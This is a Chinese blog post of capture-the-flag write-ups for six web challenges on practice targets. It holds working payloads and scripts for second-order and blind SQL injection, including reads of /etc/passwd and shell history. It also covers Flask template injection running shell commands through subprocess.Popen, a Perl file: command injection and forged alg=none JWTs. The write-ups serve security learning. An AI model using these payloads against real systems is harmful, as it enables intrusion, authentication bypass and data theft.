<h3 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h3><p>登陆，根据提示爆破密码最后三位，是666</p>
<p>想看看有没有git源码泄露，好像没有。</p>
<p><img src="buu3/21.png"></p>
<p>再添加一个config看看，</p>
<p><img src="buu3/22.png"></p>
<p>有文件返回，说明存在git源码泄露。</p>
<p>使用githack，下载一下。好像下不得</p>
<p><img src="buu3/23.png"></p>
<p>需要进行恢复一下。</p>
<p><img src="buu3/24.png"></p>
<p>还是太菜了，没恢复出来，网上拿一下源码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//write_do.php<span class="meta">&lt;?php</span>include &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;:    $category = addslashes($_POST[&#x27;category&#x27;]);    $title = addslashes($_POST[&#x27;title&#x27;]);    $content = addslashes($_POST[&#x27;content&#x27;]);    $sql = &quot;insert into board            set category = &#x27;$category&#x27;,                title = &#x27;$title&#x27;,                content = &#x27;$content&#x27;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#x27;comment&#x27;:    $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#x27;category&#x27;];    $content = addslashes($_POST[&#x27;content&#x27;]);    $sql = &quot;insert into comment            set category = &#x27;$category&#x27;,                content = &#x27;$content&#x27;,                bo_id = &#x27;$bo_id&#x27;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这里有个函数addslashes，我们在前面sql靶场见过，它看似起到了防护作用，其实导致更容易注入，复习一下。</p>
<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-10899-1-1.html">addslashes函数绕过技巧</a></p>
<p>本题为二次注入，在comment部分从数据库中取出的category没有过滤，造成了二次注入。</p>
<p>通过多行注释符，/**/，最后拼接的结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into comment set category = &#x27;1&#x27;,content=user(),/* &#x27;, content = &#x27; */#&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>这里就我们就可以闭合语句，成功注入我们想要的语句。通过content展示我们想要的内容。</p>
<p>先把</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=user(),/*</span><br></pre></td></tr></table></figure>

<p>传入category，再把注释符传入content。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>

<p>查看到用户为</p>
<p><img src="buu3/25.png"></p>
<p>看到用户为root，如此高的权限，可以尝试使用load_file()读取文件</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=load_file(&#x27;/etc/passwd&#x27;),/*</span><br></pre></td></tr></table></figure>

<p><img src="buu3/26.png"></p>
<p>读取一下历史操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=load_file(&#x27;/home/www/.bash_history&#x27;),/*</span><br></pre></td></tr></table></figure>

<p><img src="buu3/27.png"></p>
<p>整理一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmpunzip html.zip#解压rm -rf html.zip#删除压缩包cp -r html /var/www/cd /var/www/htmlrm -rf .DS_Store</span><br></pre></td></tr></table></figure>

<p>发现路径/var/www/html .DS_Store文件被删除了，但/tmp/html目录下的.DS_Store文件还在，读取一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=load_file(&#x27;/tmp/html/.DS_Store&#x27;),/*</span><br></pre></td></tr></table></figure>

<p>返回的东西好像有的没办法读取，我们通过十六进制输出，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/*</span><br></pre></td></tr></table></figure>

<p><img src="buu3/28.png"></p>
<p>转化发现文件flag_8946e1ff1ee3e40f.php</p>
<p><img src="buu3/29.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*</span><br></pre></td></tr></table></figure>

<p>最后拿到flag。</p>
<h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>15年的sql题，有点早了。</p>
<p>有个修改密码的，感觉像二次注入，实现修改管理员密码。</p>
<p>当我们注册用户名时加入双引号，再到修改密码时，报错。</p>
<p><img src="buu3/30.png"></p>
<p>开始通过注册用户名来实现注入，fuzz测试，空格被过滤了。</p>
<p>报错注入，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7c,database()),1)#</span><br></pre></td></tr></table></figure>

<p><img src="buu3/31.png"></p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#</span><br></pre></td></tr></table></figure>

<p><img src="buu3/32.png"></p>
<p>爆字段名，为flag。</p>
<p><img src="buu3/33.png"></p>
<p>拿flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7c,(select(group_concat(flag))from(flag))),1)#</span><br></pre></td></tr></table></figure>

<p>这里如果有括号就不需要再加单引号表示字符串了。</p>
<p><img src="buu3/34.png"></p>
<p>假的flag。</p>
<p>尝试一下爆users表。</p>
<p><img src="buu3/35.png"></p>
<p>希望这次别再把戏了。</p>
<p><img src="buu3/36.png"></p>
<p>这个表名不完整，真的像个小丑。</p>
<p>盲猜是</p>
<p>real_flag_1s_here</p>
<p>这返回的是啥，果然投机取巧不行。</p>
<p><img src="buu3/37.png"></p>
<p>这里主要应该是想让我们突然长度限度，之前再学习报错注入的时候，也经常有这样的问题。</p>
<p>这里空格被过滤了，想使用limit函数不太行。</p>
<p>学习新技法，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36761831/article/details/82862135">正则匹配</a>。</p>
<p>通过正则匹配读flag。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1)#</span><br></pre></td></tr></table></figure>

<p>只拿到一部分flag。</p>
<p><img src="buu3/38.png"></p>
<p>这里使用不了right，被过滤了，可以使用逆序输出reverse。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1))#</span><br></pre></td></tr></table></figure>

<p><img src="buu3/39.png"></p>
<p><img src="buu3/40.png"></p>
<p>通过php函数sttrev函数再逆序输出，</p>
<p>或者通过python，列表方法输出。</p>
<p><img src="buu3/41.png"></p>
<p><strong>本题关键：正则匹配寻找flag技巧突破报错函数长度限制，同时使用函数reverse()进行逆序输出利用</strong></p>
<h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p>存在ssti注入，提示很明显。</p>
<p>f12查看源码，根据提示get方法，通过search参数。构造相关payload。证明存在ssti注入。</p>
<p><img src="buu3/42.png"></p>
<p>查看一下类，</p>
<p><img src="buu3/44.png"></p>
<p>尝试查看所有类，也可以查看，想通过catch_warnings类，还有命令执行，都行不通。</p>
<p>学会使用一个新子类，subprocess.Popen。我们通过python脚本来爆破出subprocess.Popen子类位置。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsimport htmlimport timefor i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>):    time.sleep(<span class="number">0.06</span>)    url=<span class="string">&#x27;http://a7d6afce-442f-47cb-840a-b35cd23f0e70.node3.buuoj.cn?search=&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[%d]&#125;&#125;&#x27;</span> %(i)    r = requests.get(url)    <span class="comment">#print(url)    if &quot;subprocess.Popen&quot; in html.unescape(r.text):        print(i)        break</span></span><br></pre></td></tr></table></figure>

<p>258</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="buu3/45.png"></p>
<p>通过查找得到最后的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;cat ../flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag。</p>
<h3 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);    @mkdir($sandbox);    @chdir($sandbox);    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));    $info = pathinfo($_GET[&quot;filename&quot;]);    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</p>
<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，之前就遇到过，和escapeshellcmd配合形成漏洞。</p>
<p>pathinfo() 函数以数组的形式返回文件路径的信息。</p>
<p>代码审计，首先创建一个沙盒文件夹，路径为sandbox/加上MD5加密过后的orange加页面输出的ip</p>
<p>通过url参数传入的内容执行命令，把以filename参数传入的内容命名文件，最后把结果存入。</p>
<p><strong>方法：FILE 协议利用 OPEN 命令执行。</strong></p>
<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&amp;filename=123</span><br></pre></td></tr></table></figure>

<p>先尝试访问一下文件，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6d22ac66-1a1c-40d8-8ac8-4fa47d32a90e.node3.buuoj.cn/sandbox/fcf2bccafc269c160382150a0166d632/123</span><br></pre></td></tr></table></figure>

<p><img src="buu3/46.png"></p>
<p>看到readflag，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="buu3/47.png"></p>
<p><em><strong>GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求,GET函数底层就是调用了open处理</strong></em></p>
<p><em><strong>open存在命令执行，并且还支持file函数</strong></em></p>
<p><em><strong>直接使用file协议的open命令执行payload：</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;filename=123</span><br></pre></td></tr></table></figure>

<p>这里要特别注意这个命令执行的使用，<strong>首先得满足前面的文件存在, 才会继续到open语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|/?url=file:bash -c /readflag|&amp;filename=123/sandbox/fcf2bccafc269c160382150a0166d632/123</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3f82685f56a8">参考</a></p>
<p><strong>本题关键：file协议利用open命令执行</strong></p>
<h3 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h3><p>尝试登陆admin，弹窗</p>
<p><img src="buu3/48.png"></p>
<p>尝试注册，也注册不来，感觉需要我们以admin身份登陆拿flag。</p>
<p>百度了一下split，感觉跟js代码有关系，找一下。</p>
<p>f12可以看到app.js，访问。</p>
<p>提示是基于Node.js的koa框架，但是这个页面的代码并不是逻辑代码，用处不大。<br>在注释里提示静态文件处理出现问题，那么可能会出现任意文件读取漏洞</p>
<p><strong>这里需要对koa框架的目录有一定的了解。</strong></p>
<p><strong>其中controllers目录是项目控制器存放目录：接受请求，处理逻辑</strong></p>
<p><strong>访问controllers/api.js发现处理逻辑</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);const fs = require(&#x27;fs&#x27;)const jwt = require(&#x27;jsonwebtoken&#x27;)const APIError = require(&#x27;../rest&#x27;).APIError;module.exports = &#123;    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;        const &#123;username, password&#125; = ctx.request.body;        if(!username || username === &#x27;admin&#x27;)&#123;            throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);        &#125;        if(global.secrets.length &gt; 100000) &#123;            global.secrets = [];        &#125;        const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);        const secretid = global.secrets.length;        global.secrets.push(secret)        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);        ctx.rest(&#123;            token: token        &#125;);        await next();    &#125;,    &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;        const &#123;username, password&#125; = ctx.request.body;        if(!username || !password) &#123;            throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);        &#125;        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);        &#125;        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);        const status = username === user.username &amp;&amp; password === user.password;        if(status) &#123;            ctx.session.username = username;        &#125;        ctx.rest(&#123;            status        &#125;);        await next();    &#125;,    &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;        if(ctx.session.username !== &#x27;admin&#x27;)&#123;            throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);        &#125;        const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();        ctx.rest(&#123;            flag        &#125;);        await next();    &#125;,    &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;        ctx.session.username = null;        ctx.rest(&#123;            status: true        &#125;)        await next();    &#125;&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="buu3/49.png"></p>
<p>可以伪造jwt进行登陆。</p>
<p>其实前面应该先用burp抓包一下，思路更明显，直接发现JWT.其实题目提示也很明显，登陆。</p>
<p>JWT支持算法为None，如果alg字段为None，签名会被置空，这样任何的token都是有效的，后端将不执行签名验证</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">深入了解JWT攻击</a></p>
<p>通过网站<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<p>得到数据，然后伪造，置为none，让”secretid”为空，他的加密算法就为空，所以那个加密就废了</p>
<p>或者，下面分开base64编码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;.&#123;&quot;secretid&quot;:[],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1587632063&#125;.</span><br></pre></td></tr></table></figure>

<p>这里base64加密都不加. </p>
<p>加密后有等号，去掉，再分别加上.</p>
<p>两个都是这样，最后拼接。</p>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjogImFkbWluIiwicGFzc3dvcmQiOiAiMTIzNDU2IiwiaWF0IjogMTU4NzYzMjA2M30.</span><br></pre></td></tr></table></figure>

<p><img src="buu3/50.png"></p>
<p>点击get flag，然后抓包go。</p>
<p><img src="buu3/52.png"></p>
<p>也可以通过python进行加密，python有JWT模块，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwttoken = jwt.encode(&#123;  <span class="string">&quot;secretid&quot;</span>: [],  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>,  <span class="string">&quot;iat&quot;</span>: <span class="number">1590657826</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>





<h3 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h3><p>—sql盲注+无列名注入</p>
<p>fuzz测试一下，发现||没被过滤，information被过滤了，应该是和无列名注入有关了。</p>
<p>测试回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2||1=1</span><br></pre></td></tr></table></figure>

<p>正确返回，Nu1L</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2||1=2</span><br></pre></td></tr></table></figure>

<p>错误返回，V&amp;N</p>
<p>爆数据库名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://637c56e9-8e90-4d3c-8f52-76fc2058a8bf.node4.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left=<span class="number">32</span></span><br><span class="line">    right=<span class="number">128</span></span><br><span class="line">    mid=(left+right)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (left&lt;right):</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;2||(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)&#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;429&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            left=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;V&amp;N&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            right=mid</span><br><span class="line">        mid=(left+right)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># give_grandpa_pa_pa_pa</span></span><br></pre></td></tr></table></figure>

<p>由于information_schema被过滤了，我们需要使用其他的库，<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">参考</a></p>
<p>我们试一下<strong>sys.x$schema_flattened_keys</strong>是可以用的。</p>
<p>爆破数据表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://637c56e9-8e90-4d3c-8f52-76fc2058a8bf.node4.buuoj.cn/index.php&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    left=32</span><br><span class="line">    right=128</span><br><span class="line">    mid=(left+right)&gt;&gt;1</span><br><span class="line">    while (left&lt;right):</span><br><span class="line">        data=&#123;&quot;id&quot;:&quot;2||(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid)&#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        if &#x27;429&#x27; or &#x27;404&#x27; in r.text:</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            left=mid+1</span><br><span class="line">        if &#x27;V&amp;N&#x27; in r.text:</span><br><span class="line">            right=mid</span><br><span class="line">        mid=(left+right)&gt;&gt;1</span><br><span class="line">    if(mid==32 or mid ==127):</span><br><span class="line">        break</span><br><span class="line">    flag+=chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>得到两个表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1ag_1s_h3r3_hhhhh,users233333333333333</span><br></pre></td></tr></table></figure>

<p>后面的不会处理了，<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45669205/article/details/116064642?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">看一下讲的很详细的一篇不错的文章</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://637c56e9-8e90-4d3c-8f52-76fc2058a8bf.node4.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    res=<span class="string">&#x27;0x&#x27;</span>+res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(str_hex(flag+<span class="built_in">chr</span>(j)))&#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;429&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

















